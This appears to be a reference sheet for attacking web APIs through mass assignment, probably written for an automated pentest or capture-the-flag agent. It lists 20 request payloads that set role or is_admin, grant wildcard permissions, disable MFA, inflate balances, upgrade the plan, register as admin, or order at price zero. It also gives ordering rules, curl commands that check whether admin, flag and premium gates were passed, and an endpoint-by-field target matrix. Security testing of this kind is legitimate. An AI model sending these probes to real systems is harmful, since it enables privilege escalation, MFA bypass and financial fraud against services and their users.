# Probe matrix — the full endpoint × field × carrier probe set

## The 20-probe core set

```
# the privilege probes — widest binder first
P1:  PATCH /users/me   {"role":"admin"}
P2:  PATCH /users/me   {"is_admin":true}
P3:  PATCH /users/me   {"isAdmin":true}
P4:  PATCH /users/me   {"is_staff":true}
P5:  PATCH /users/me   {"profile":{"role":"admin"}}
P6:  PATCH /users/me   {"settings":{"admin":true}}
P7:  PATCH /users/me   {"permissions":["*"]}
P8:  PATCH /users/me   {"groups":[{"id":1}]}
P9:  PATCH /users/me   {"_t":"AdminUser"}
P10: PATCH /users/me   role=admin                     (form)

# the state probes
P11: PATCH /users/me   {"verified":true}
P12: PATCH /users/me   {"is_active":true}
P13: PATCH /users/me   {"approved":true}
P14: PATCH /users/me   {"mfa_enabled":false}

# the economic probes
P15: PATCH /users/me   {"balance":99999}
P16: PATCH /users/me   {"credits":99999}
P17: PATCH /users/me   {"plan":"enterprise"}

# the create probes
P18: POST /register    {"username":"x","password":"p","role":"admin"}
P19: POST /register    username=x&password=p&role=admin   (form)

# the economic endpoints
P20: POST /orders      {"product":1,"price":0}
```

## The probe-budget allocation

```
endpoint budget: 5 probes per mechanism class (AGENTS.md)
field budget:    1 probe per semantic (not per spelling)
carrier budget:  1 probe per carrier shape (not per variant)
```

The 20-probe set covers ~8 semantics × ~3 carriers × ~3 endpoints —
the falsifier depth prunes it to ~5-8 real probes.

## The probe ordering rule

```
endpoint: PATCH /me → PUT → POST/register → orders → import → GQL → admin
field:    privilege → verify → econ → plan → ownership → workflow → internals
carrier:  flat → nested → form → prefixed → array → typed → PUT → override
```

The widest binder + highest-value semantic + least-tested carrier =
the first probe.

## The read-back per probe

```bash
# after each canary — a different-endpoint GET
curl -b "$JAR" "$BASE/api/me"       # the store's truth
# the decision exercise
curl -b "$JAR" "$BASE/admin"        # role gate
curl -b "$JAR" "$BASE/flag"         # verify gate
curl -b "$JAR" "$BASE/premium"      # plan gate
curl -b "$JAR" -X POST "$BASE/checkout"   # totals gate
```

## The matrix notation

```
        PATCH/me   PUT/:id   POST/reg   POST/orders   import   GQL
role      P          P         P           —           P       args
is_admin  P          P         P           —           P       args
verified  P          P         P           —           P       —
balance   P          P         —           P           P       —
price     —          —         —           P           P       —
plan      P          P         —           —           P       —
profile.* P          P         —           —           P       input
membership.* P       P         —           —           P       input
_t        P          P         P           —           P       —
type      P          P         P           —           P       —
```

`P` = probe-worthy; `—` = not applicable; the matrix is the live-cell
map the falsifiers prune.
